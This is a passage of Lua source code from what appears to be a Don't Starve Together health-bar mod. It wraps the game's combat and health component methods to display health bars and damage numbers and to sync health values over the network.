        if attacker and attacker:IsValid() and attacker.components.health then
            ShowHealthBar(attacker)
        end
        return OldGetAttacked(self, attacker, damage, weapon, stimuli, ...)
    end
    self.GetAttacked = dyc_getattacked
end
local function HealthDYC(self)
    local dodeltafn = self.DoDelta
    local function dyc_dodelta(self, amount, overtime, cause, ignore_invincible, afflicter, ignore_absorb, ...)
        if
            self.inst:IsValid() and amount <= -TUNING.DYC_HEALTHBAR_DDTHRESHOLD or
                (amount >= 0.9 and self.maxhealth - self.currenthealth >= 0.9)
         then
            ShowHealthBar(self.inst)
        end
        if not IsDST() and TUNING.DYC_HEALTHBAR_DDON and IsDistOK(self.inst) then
            local dd = SpawnPrefab("dyc_damagedisplay")
            dd:DamageDisplay(self.inst)
        end
        local returnValue = dodeltafn(self, amount, overtime, cause, ignore_invincible, afflicter, ignore_absorb, ...)
        if IsDST() and self.inst.dychealthbar then
            local hb = self.inst.dychealthbar
            if hb.dycHbIgnoreFirstDoDelta == true then
                hb.dycHbIgnoreFirstDoDelta = false
                self.inst:DoTaskInTime(
                    0.01,
                    function()
                        hb.dychp_net:set_local(0)
                        hb.dychp_net:set(self.currenthealth)
                        if hb.dychpmax ~= self.maxhealth then
                            hb.dychpmax_net:set_local(0)
                            hb.dychpmax_net:set(self.maxhealth)
                        end
                    end
                )
            else
                hb.dychp_net:set_local(0)
                hb.dychp_net:set(self.currenthealth)
                if hb.dychpmax ~= self.maxhealth then
                    hb.dychpmax_net:set_local(0)
                    hb.dychpmax_net:set(self.maxhealth)
                end
            end
        end
        return returnValue
    end
    self.DoDelta = dyc_dodelta
end
local function AnyPost(inst)
end
AddComponentPostInit(
    "combat",
    function(Combat, inst)
        if not IsDST() or GLOBAL.TheWorld.ismastersim then
            if inst.components.combat then
                CombatDYC(inst.components.combat)
            end
        end
    end
)
AddComponentPostInit(
    "health",
    function(Health, inst)
        if not IsDST() or GLOBAL.TheWorld.ismastersim then
            if inst.components.health then
                HealthDYC(inst.components.health)
            end
        end
    end
)
AddPrefabPostInit("world", WorldPost)
AddPlayerPostInit(PlayerPost)
AddPrefabPostInitAny(AnyPost)
